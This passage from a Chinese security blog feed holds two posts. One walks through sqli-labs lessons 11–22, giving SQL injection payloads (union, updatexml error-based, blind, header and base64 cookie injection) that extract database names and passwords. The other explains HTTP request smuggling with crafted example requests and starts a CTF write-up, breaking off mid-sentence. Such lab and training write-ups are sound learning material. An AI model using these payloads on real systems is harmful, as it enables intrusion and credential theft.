      <link href="/2019/11/06/sqli-labs%E6%94%BB%E5%85%B33(Less-11-Less-22)/"/>
      <url>/2019/11/06/sqli-labs%E6%94%BB%E5%85%B33(Less-11-Less-22)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>好久没打sqli-labs了，闲来无事继续打一下。</p><h3 id="一、联合查询-POST型"><a href="#一、联合查询-POST型" class="headerlink" title="一、联合查询-POST型"></a>一、联合查询-POST型</h3><h4 id="Less-11-39"><a href="#Less-11-39" class="headerlink" title="Less-11 &#39;"></a>Less-11 <code>&#39;</code></h4><p><strong>1.注入点判断</strong></p><pre><code class="sql">uname=admin\&amp;passwd=&amp;submit=Submit</code></pre><p><img src="http://img-blog.csdnimg.cn/20191103202516739.png" alt="在这里插入图片描述"><br>通过添加反斜杠<code>\</code>，得知是<code>&#39;</code>闭合<br><strong>注入测试</strong></p><pre><code class="sql">uname=admin&#39; or &#39;a&#39;=&#39;a&amp;passwd=1&amp;submit=Submit</code></pre><p>或</p><pre><code class="sql">uname=admin&#39; and 1=1#&amp;passwd=&amp;submit=Submit</code></pre><p><img src="http://img-blog.csdnimg.cn/20191105193140958.png" alt="在这里插入图片描述"><br><strong>2.显示位判断</strong></p><pre><code class="sql">uname=不存在的用户&#39; union select 1,2 #&amp;passwd=&amp;submit=Submit</code></pre><p><img src="http://img-blog.csdnimg.cn/20191103202743577.png" alt="在这里插入图片描述"><br>显示位有1、2两处<br><strong>3.获取所有数据库名</strong></p><pre><code class="sql">uname=1&#39; union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#&amp;passwd=&amp;submit=Submit</code></pre><p><img src="http://img-blog.csdnimg.cn/20191103203924954.png" alt="在这里插入图片描述"><br>获取当前数据库名</p><pre><code class="sql">uname=1&#39; union select database(),2 #&amp;passwd=&amp;submit=Submit</code></pre><p><img src="http://img-blog.csdnimg.cn/20191103203552881.png" alt="在这里插入图片描述"><br><strong>4.获取所有数据表名</strong></p><pre><code class="sql">uname=1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=&amp;submit=Submit</code></pre><p><img src="http://img-blog.csdnimg.cn/20191103204350619.png" alt="在这里插入图片描述"><br><strong>4.获取所有字段名</strong></p><pre><code class="sql">uname=1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;#&amp;passwd=&amp;submit=Submit</code></pre><p><img src="http://img-blog.csdnimg.cn/2019110320474884.png" alt="在这里插入图片描述"><br><strong>5.获取所有数据</strong></p><pre><code class="sql">uname=1&#39; union select 1,group_concat(password) from users#&amp;passwd=&amp;submit=Submit</code></pre><p><img src="http://img-blog.csdnimg.cn/20191103204951450.png" alt="在这里插入图片描述"></p><h4 id="Less-12-quot"><a href="#Less-12-quot" class="headerlink" title="Less-12 &quot;)"></a>Less-12 <code>&quot;)</code></h4><p><strong>注入点判断</strong><br>通过添加反斜杠<code>\</code>，得知是<code>&quot;)</code>闭合<br><img src="http://img-blog.csdnimg.cn/20191103211030533.png" alt="在这里插入图片描述"><br><strong>注入测试</strong></p><pre><code class="sql">uname=admin&quot;) or (&quot;a&quot;=&quot;a&amp;passwd=1&amp;submit=Submit</code></pre><p>或</p><pre><code class="sql">uname=admin&quot;) and 1=1#&amp;passwd=1&amp;submit=Submit</code></pre><p>爆数据库、数据表、字段、记录和Less-11类似。</p><h3 id="二、报错注入POST型"><a href="#二、报错注入POST型" class="headerlink" title="二、报错注入POST型"></a>二、报错注入POST型</h3><p>因为总结过，所以这里不再总结。<br>CSDN<a href="https://blog.csdn.net/qq_43625917/article/details/101235231" target="_blank" rel="noopener">报错注入</a>或个人博客<a href="https://qwzf.github.io/2019/09/25/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#more">报错注入</a></p><h4 id="Less-13-39"><a href="#Less-13-39" class="headerlink" title="Less-13 &#39;)"></a>Less-13 <code>&#39;)</code></h4><p><strong>注入点判断</strong><br>通过添加反斜杠<code>\</code>，得知是<code>&#39;)</code>闭合。<br>进行其它注入操作时，发现没有回显。而加反斜杠测试闭合方式却有回显，因为产生报错。于是想到进行其它注入操作时，应该可以使用报错注入(这里暂且使用Xpath注入，也可以使用其它报错注入方式)。<br><strong>爆数据库</strong></p><pre><code class="sql">uname=1&#39;) and (updatexml(1,concat(0x7e,(select database()),0x7e),1))#&amp;passwd=&amp;submit=Submit</code></pre><p><img src="http://img-blog.csdnimg.cn/20191105205826341.png" alt="在这里插入图片描述"><br><strong>爆表</strong></p><pre><code class="sql">uname=1&#39;) and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1))#&amp;passwd=&amp;submit=Submit</code></pre><p><strong>爆字段</strong></p><pre><code class="sql">uname=1&#39;) and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;),0x7e),1))#&amp;passwd=&amp;submit=Submit</code></pre><p><strong>爆数据</strong></p><pre><code class="sql">uname=1&#39;) and (updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1))#&amp;passwd=&amp;submit=Submit</code></pre><h4 id="Less-14-quot"><a href="#Less-14-quot" class="headerlink" title="Less-14 &quot;"></a>Less-14 <code>&quot;</code></h4><p>通过添加反斜杠<code>\</code>，得知是<code>&quot;</code>闭合<br>其它注入操作，把Less-13的<code>&#39;)</code>改为<code>&quot;</code>即可。</p><h3 id="三、盲注POST型"><a href="#三、盲注POST型" class="headerlink" title="三、盲注POST型"></a>三、盲注POST型</h3><h4 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h4><p>post传入</p><pre><code class="sql">uname=admin\&amp;passwd=&amp;submit=Submit</code></pre><p>通过添加反斜杠<code>\</code>，没有回显闭合方式，只回显了登录失败页面。<br><img src="http://img-blog.csdnimg.cn/20191105211133247.jpg" alt="在这里插入图片描述"><br>尝试万能语句</p><pre><code class="sql">&#39; or 1=1#</code></pre><p><img src="http://img-blog.csdnimg.cn/20191105211001177.jpg" alt="在这里插入图片描述"><br>登录成功。发现登录成功和登录失败回显不同。于是想到了另一种思路来做，即SQL盲注，并且是POST型的布尔盲注，因为之前总结过GET型的SQL盲注，还做了几道POST盲注的题。所以这里不再详细总结。<br>CSDN：<a href="https://blog.csdn.net/qq_43625917/article/details/96484073" target="_blank" rel="noopener">sqli-labs攻关2(布尔盲注、时间盲注)</a>或个人博客<a href="https://qwzf.github.io/2019/07/19/sqli-labs%E6%94%BB%E5%85%B32(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E3%80%81%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/#more">sqli-labs攻关2(布尔盲注、时间盲注)</a><br>先知社区：<a href="https://xz.aliyun.com/t/6595" target="_blank" rel="noopener">SQL盲注的简单分析</a></p><p><strong>测试</strong><br><em>测闭合方式</em></p><pre><code class="sql">uname=admin&#39;#&amp;passwd=&amp;submit=Submit</code></pre><p>单引号闭合</p><p><em>测长度</em></p><pre><code class="sql">uname=admin&#39; and (length(database())=8)#&amp;passwd=&amp;submit=Submit</code></pre><p>数据库长度为8<br><em>测字符</em></p><pre><code class="sql">uname=admin&#39; and (ascii(substr(database(),1,1))&gt;97)#&amp;passwd=&amp;submit=Submit</code></pre><p>说明数据库第一个字符ASCII码大于97</p><p>具体注入步骤，参考<a href="https://xz.aliyun.com/t/6595" target="_blank" rel="noopener">SQL盲注的简单分析</a></p><h4 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h4><p>依旧是SQL盲注，与Less-15相比，闭合方式由<code>&#39;</code>变成了<code>&quot;)</code></p><p>当然，布尔盲注的题可以用时间盲注的方法来做，只不过时间盲注效率有点低。</p><h3 id="四、POST注入"><a href="#四、POST注入" class="headerlink" title="四、POST注入"></a>四、POST注入</h3><h4 id="1、基于错误POST更新查询注入"><a href="#1、基于错误POST更新查询注入" class="headerlink" title="1、基于错误POST更新查询注入"></a>1、基于错误POST更新查询注入</h4><p>过滤函数：<code>check_input()</code><br><strong>Less-17</strong><br>查看源码发现，<code>check_input()</code>对传入的uname进行了限制 ，只能16个字符。<br>调用了<code>get_magic_quotes_gpc()</code> 将  <code>&#39;   &quot;</code>  <code>空格</code> <code>/</code>  进行了转义。<br>却没有对passwd进行任何处理。</p><p>所以与Less-14相比，注入点不在uname，注入点在passwd。测试发现闭合方式为<code>&#39;</code>。<br>这里测试个爆数据库的。<br>爆库</p><pre><code class="sql">uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;submit=Submit</code></pre><p><img src="http://img-blog.csdnimg.cn/2019110619383653.jpg" alt="在这里插入图片描述"><br>但当我测试到爆数据时，却没爆出来，回显信息为：</p><pre><code class="bash">You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code></pre><p>查询百度和大师傅博客，发现解决方法：在外面加一层<code>select</code>即可解决。<br>payload</p><pre><code class="sql">uname=admin&amp;passwd=&#39; or updatexml(1,concat(0x7e,(select username from (select username from users)b limit 0,1),0x7e),1)#&amp;submit=Submit</code></pre><h4 id="2、User-Agent注入"><a href="#2、User-Agent注入" class="headerlink" title="2、User-Agent注入"></a>2、User-Agent注入</h4><p>很多网站都会记录用户的<code>User-Agent</code>， 这为注入提供了条件。<br><strong>注入原理</strong><br>后台在接收UA时没有对UA做过滤，也没有PDO进行数据交互（实际PDO是非常有必要的），导致UA中有恶意代码，最终在数据库中执行。<br><strong>Less-18</strong><br>登录框输入<code>admin</code> <code>123</code>，登录失败只有如下信息<br><img src="http://img-blog.csdnimg.cn/20191106210808932.jpg" alt="在这里插入图片描述"><br>输入<code>admin</code> <code>admin</code>，登录成功返回如下信息<br><img src="http://img-blog.csdnimg.cn/20191106210958376.jpg" alt="在这里插入图片描述"><br>猜测应该是在<code>User-Agent</code>进行注入。于是<code>FireFox + Burp</code>或<code>Firefox+hackbar插件</code>。<br><strong>测注入点</strong></p><pre><code class="sql">User-Agent: 1&#39;</code></pre><p>报错回显<br><img src="http://img-blog.csdnimg.cn/20191106233113655.jpg" alt="在这里插入图片描述"><br>发现这里果然存在注入。<br><strong>测闭合方式</strong></p><pre><code class="sql">User-Agent: 1&#39; and &#39;1&#39;=&#39;1</code></pre><p>回显<br><img src="http://img-blog.csdnimg.cn/20191106231228875.jpg" alt="在这里插入图片描述"><br>发现是<code>&#39;</code>闭合方式。于是开始其它注入操作<br><strong>爆库</strong></p><pre><code class="sql">User-Agent: 1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></pre><p><img src="http://img-blog.csdnimg.cn/20191106231131805.jpg" alt="在这里插入图片描述"><br>爆表、爆字段、爆数据，后面的和Less-13大致一样，不再测试。</p><h4 id="3、Referer注入"><a href="#3、Referer注入" class="headerlink" title="3、Referer注入"></a>3、Referer注入</h4><p><strong>Less-19</strong><br>先登录，登录成功，得到回显：<br><img src="http://img-blog.csdnimg.cn/20191106233210456.jpg" alt="在这里插入图片描述"><br>猜测应该是在header里的<code>Referer</code>里进行注入<br><strong>测注入点</strong></p><pre><code class="sql">Referer: 1&#39;</code></pre><p><img src="http://img-blog.csdnimg.cn/20191106233656461.jpg" alt="在这里插入图片描述"><br><strong>测闭合方式</strong></p><pre><code class="sql">Referer: 1&#39; and &#39;1&#39;=&#39;1</code></pre><p><img src="http://img-blog.csdnimg.cn/20191106233923289.jpg" alt="在这里插入图片描述"><br><strong>爆库</strong></p><pre><code class="sql">Referer: 1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></pre><p><img src="http://img-blog.csdnimg.cn/20191106234203347.jpg" alt="在这里插入图片描述"><br>其它注入操作和Less-18类似。</p><h4 id="4、Cookie注入"><a href="#4、Cookie注入" class="headerlink" title="4、Cookie注入"></a>4、Cookie注入</h4><p><strong>Less-20</strong><br>和上两道题一个路数，先登录，得到回显<br><img src="http://img-blog.csdnimg.cn/20191106234720450.jpg" alt="在这里插入图片描述"><br>猜测应该是在header里的<code>Cookie</code>里进行注入<br><strong>测注入点</strong></p><pre><code class="sql">Cookie: uname=admin&#39;</code></pre><p><img src="http://img-blog.csdnimg.cn/20191107001803748.jpg" alt="在这里插入图片描述"><br><strong>测闭合方式</strong></p><pre><code class="sql">Cookie: uname=admin&#39; and &#39;1&#39;=&#39;1</code></pre><p><img src="http://img-blog.csdnimg.cn/201911070016070.jpg" alt="在这里插入图片描述"><br><strong>爆库</strong></p><pre><code class="sql">Cookie: uname=admin&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></pre><p><img src="http://img-blog.csdnimg.cn/20191107001507777.jpg" alt="在这里插入图片描述"><br><strong>Less-21</strong><br>登录，发现<code>Cookie</code>中为base64，解码得到admin<br><img src="http://img-blog.csdnimg.cn/20191107002528784.jpg" alt="在这里插入图片描述"><br>猜想只是比Less-20多了一个Base64<br>对<code>admin&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code>进行base64编码。</p><pre><code class="sql">Cookie:  uname=YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIGFuZCAnMSc9JzE=</code></pre><p>测试，得到数据库<br><img src="http://img-blog.csdnimg.cn/20191107002743388.jpg" alt="在这里插入图片描述"><br><strong>Less-22</strong><br>把Less-21单引号改为双引号。即对<code>admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) and &quot;1&quot;=&quot;1</code>进行base64编码。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>至此，总算把Page-1的SQL注入关卡打完了。总的来说，22个sqli-labs关卡主要涉及的SQL注入的姿势有：</p><ul><li>GET型错误型注入、联合查询注入、报错注入、盲注、导出文件注入</li><li>POST型联合查询注入、报错注入、盲注</li><li>POST注入</li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
            <tag> POST型联合查询注入 </tag>
            
            <tag> POST型报错注入 </tag>
            
            <tag> POST型盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一道题到HTTP请求走私</title>
      <link href="/2019/10/27/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%88%B0HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
      <url>/2019/10/27/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%88%B0HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h3><p>首发在先知社区</p><p>之前一次线上赛，遇到一道Web题，涉及了HTTP请求走私。由于之前未学习过，从而我展开了HTTP请求走私的学习之旅。</p><h3 id="0x01-HTTP请求走私是什么"><a href="#0x01-HTTP请求走私是什么" class="headerlink" title="0x01 HTTP请求走私是什么"></a>0x01 HTTP请求走私是什么</h3><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><h3 id="0x02-为什么会产生HTTP请求走私"><a href="#0x02-为什么会产生HTTP请求走私" class="headerlink" title="0x02 为什么会产生HTTP请求走私"></a>0x02 为什么会产生HTTP请求走私</h3><p><strong>请求走私漏洞成因</strong></p><blockquote><p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p></blockquote><p>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。<br>同时使用两种不同的方法时，<code>Content-Length</code>无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为<code>Content-Length</code>的长度有效，有些以<code>Transfer-Encoding</code>有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞。</p><p><strong>RFC2616规范</strong></p><blockquote><p>如果接收的消息同时包含传输编码头字段(Transfer-Encoding)和内容长度头(Content-Length)字段，则必须忽略后者。</p></blockquote><p>由于规范默许可以使用<code>Transfer-Encoding</code>和<code>Content-Length</code>处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，将<code>Transfer-Encoding</code>隐藏在服务端的一个<code>chain</code>中时，它将会回退到使用<code>Content-Length</code>去发送请求。</p><p><strong>走私攻击实现</strong><br>当向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，代理服务器可能认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p><h4 id="扩展：为什么会出现多次请求"><a href="#扩展：为什么会出现多次请求" class="headerlink" title="扩展：为什么会出现多次请求"></a>扩展：为什么会出现多次请求</h4><p>这与最为广泛的HTTP 1.1的协议特性——<code>Keep-Alive&amp;Pipeline</code>有关。<br>在<code>HTTP1.0</code>之前的协议设计中，客户端每进行一次HTTP请求，需要同服务器建立一个TCP链接。<br>而现代的Web页面是由多种资源组成的，要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种资源，如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在<code>HTTP1.1</code>中，增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p><p><strong>Keep-Alive</strong>：在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭<code>TCP链接</code>，后面对相同目标服务器的HTTP请求，重用这一个TCP链接。这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在<code>HTTP1.1</code>中默认开启的。<br><strong>Pipeline(http管线化)</strong>：http管线化是一项实现了多个http请求但不需要等待响应就能够写进同一个socket的技术，仅有http1.1规范支持http管线化。在这里，客户端可以像流水线一样发送自己的<code>HTTP</code>请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p><p>现在，浏览器默认不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。<br>下面这是典型的CDN加速图和拓扑结构图<br>CDN加速图<br><img src="http://img-blog.csdnimg.cn/20191024211636393.jpg" alt="在这里插入图片描述"><br>拓扑结构图<br><img src="http://img-blog.csdnimg.cn/20191024210914446.png" alt="在这里插入图片描述"></p><h3 id="0x03-如何执行HTTP请求走私攻击"><a href="#0x03-如何执行HTTP请求走私攻击" class="headerlink" title="0x03 如何执行HTTP请求走私攻击"></a>0x03 如何执行HTTP请求走私攻击</h3><p>HTTP请求走私攻击涉及将<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p><blockquote><p>CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。<br>TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。<br>TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p></blockquote><h3 id="0x04-HTTP请求走私攻击的五种方式"><a href="#0x04-HTTP请求走私攻击的五种方式" class="headerlink" title="0x04 HTTP请求走私攻击的五种方式"></a>0x04 HTTP请求走私攻击的五种方式</h3><h4 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h4><p>所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。<br>前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p><strong>构造请求示例</strong>：</p><pre><code class="bash">GET / HTTP/1.1\r\nHost: test.com\r\nContent-Length: 44\r\nGET / secret HTTP/1.1\r\nHost: test.com\r\n\r\n</code></pre><blockquote><p><code>\r\n</code>是换行的意思，windows的换行是<code>\r\n</code>，unix的是<code>\n</code>，mac的是<code>\r</code></p></blockquote><p><strong>攻击流程</strong>：<br>前端服务器收到该请求，读取<code>Content-Length</code>，判断这是一个完整的请求。<br>然后转发给后端服务器，后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，后端服务器就认为这是收到了两个请求，分别是：</p><p>第一个：</p><pre><code class="bash">GET / HTTP/1.1\r\nHost: test.com\r\n</code></pre><p>第二个：</p><pre><code class="bash">GET / secret HTTP/1.1\r\nHost: test.com\r\n</code></pre><p>所以造成了请求走私。</p><h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><p><strong>RFC7230规范</strong></p><blockquote><p>在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p></blockquote><p>有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。<br>但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。<br><strong>构造请求示例</strong>：</p><pre><code class="bash">POST / HTTP/1.1\r\nHost: test.com\r\nContent-Length: 8\r\nContent-Length: 7\r\n12345\r\na</code></pre><p><strong>攻击流程</strong>：<br>中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。<br>而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母<code>a</code>，对于后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完毕。<br>如果此时有一个其他的正常用户对服务器进行了请求：</p><pre><code class="bash">GET /index.html HTTP/1.1\r\nHost: test.com\r\n</code></pre><p>因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是：</p><pre><code class="bash">aGET /index.html HTTP/1.1\r\nHost: test.com\r\n</code></pre><p>这时，用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF的攻击方式。</p><p>但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？<br>所以想到前面所说的<br><strong>RFC2616规范</strong></p><blockquote><p>如果收到同时存在<code>Content-Length</code>和<code>Transfer-Encoding</code>这两个请求头的请求包时，在处理的时候必须忽略<code>Content-Length</code>。</p></blockquote><p>所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。</p><h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>请求头。</p><p><strong>chunk传输数据(size的值由16进制表示)</strong></p><pre><code class="bash">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</code></pre><p><strong>chunked编码</strong><br>参考：<a href="https://blog.csdn.net/yankai0219/article/details/8269922" target="_blank" rel="noopener">http协议中content-length 以及chunked编码分析</a><br><strong>构造请求示例</strong>：</p><pre><code class="bash">POST / HTTP/1.1\r\nHost: test.com\r\n......Connection: keep-alive\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\na</code></pre><p>连续发送几次请求就可以获得响应。<br><strong>攻击流程</strong>：<br>由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p><pre><code class="bash">0\r\n\r\na</code></pre><p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到</p><pre><code class="bash">0\r\n\r\n</code></pre><p>认为已经读取到结尾了。<br>但剩下的字母<code>a</code>就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求：</p><pre><code class="bash">aPOST / HTTP/1.1\r\nHost: test.com\r\n......</code></pre><p>服务器在解析时就会产生报错了，从而造成HTTP请求走私。</p><h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>请求头，后端服务器处理<code>Content-Length</code>请求头。<br><strong>构造请求示例</strong>：</p><pre><code class="bash">POST / HTTP/1.1\r\nHost: test.com\r\n......Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n12\r\naPOST / HTTP/1.1\r\n\r\n0\r\n\r\n</code></pre><p><strong>攻击流程</strong>：<br>前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p><pre><code class="bash">0\r\n\r\n</code></pre><p>认为是读取完毕了。<br>此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，因为请求体的长度为<code>4</code>.也就是当它读取完</p><pre><code class="bash">12\r\n</code></pre><p>就认为这个请求已经结束了。后面的数据就认为是另一个请求：</p><pre><code class="bash">aPOST / HTTP/1.1\r\n\r\n0\r\n\r\n</code></pre><p>成功报错，造成HTTP请求走私。</p><h4 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h4><p>TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。在某种意义上这还是<code>CL-TE</code>或者<code>TE-CL</code>。<br><strong>构造请求示例</strong>：</p><pre><code class="bash">POST / HTTP/1.1\r\nHost: test.com\r\n......Content-length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n5c\r\naPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n</code></pre><p><strong>攻击流程</strong>：<br>前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p><pre><code class="bash">0\r\n\r\n</code></pre><p>认为是读取结束。<br>此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理<code>Transfer-encoding</code>请求头，将<code>Transfer-Encoding</code>隐藏在服务端的一个<code>chain</code>中时，它将会回退到使用<code>Content-Length</code>去发送请求。读取到</p><pre><code class="bash">5c\r\n</code></pre><p>认为是读取完毕了。后面的数据就认为是另一个请求：</p><pre><code class="bash">aPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n</code></pre><p>成功报错，造成HTTP请求走私。</p><h3 id="0x05-HTTP请求走私实战"><a href="#0x05-HTTP请求走私实战" class="headerlink" title="0x05 HTTP请求走私实战"></a>0x05 HTTP请求走私实战</h3><p>在我学HTTP请求走私之前，正是因为碰到一道Web题要使用HTTP请求走私。现在复现一下</p><h4 id="RoarCTF2019-Web：easy-calc"><a href="#RoarCTF2019-Web：easy-calc" class="headerlink" title="RoarCTF2019-Web：easy_calc"></a>RoarCTF2019-Web：easy_calc</h4><p>进去发现是个计算器<br><img src="http://img-blog.csdnimg.cn/20191026171523775.png" alt="在这里插入图片描述"><br>这道题是国赛的love_math的修改版。国赛题<code>love_math</code>参考Smi1e师傅的Writeup：<a href="https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">国赛love_math题解</a><br>输入<code>calc.php</code>，发现了网站源码<br><img src="http://img-blog.csdnimg.cn/20191027190427578.png" alt="在这里插入图片描述"><br>这道题除去了长度限制，payload中不能包含</p><blockquote><p>‘ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`‘, ‘[‘, ‘]’等字符</p></blockquote><p>师傅的Writeup还说网站加了waf，需要绕过waf。所以还需要绕过waf，测试发现当我们提交一些字符时，会直接<code>403</code>。<code>403</code>？！应该就是走私报错了，经测试发现的确存在服务器存在http走私漏洞，可以用来绕waf。</p><p>因禁了一些字符，所以不能直接getflag，需要继续分析payload构造。</p><h5 id="相关PHP函数"><a href="#相关PHP函数" class="headerlink" title="相关PHP函数"></a>相关PHP函数</h5><p><strong>scandir() 函数</strong><br>返回指定目录中的文件和目录的数组。<br><img src="http://img-blog.csdnimg.cn/20191027191218256.png" alt="在这里插入图片描述"><br><strong>base_convert() 函数</strong><br>在任意进制之间转换数字。<br><img src="http://img-blog.csdnimg.cn/20191027191416527.png" alt="在这里插入图片描述"><br><strong>dechex() 函数</strong>：把十进制转换为十六进制。<br><strong>hex2bin() 函数</strong>：把十六进制值的字符串转换为 ASCII 字符。<br><strong>readfile() 函数</strong><br>输出一个文件。<br>该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 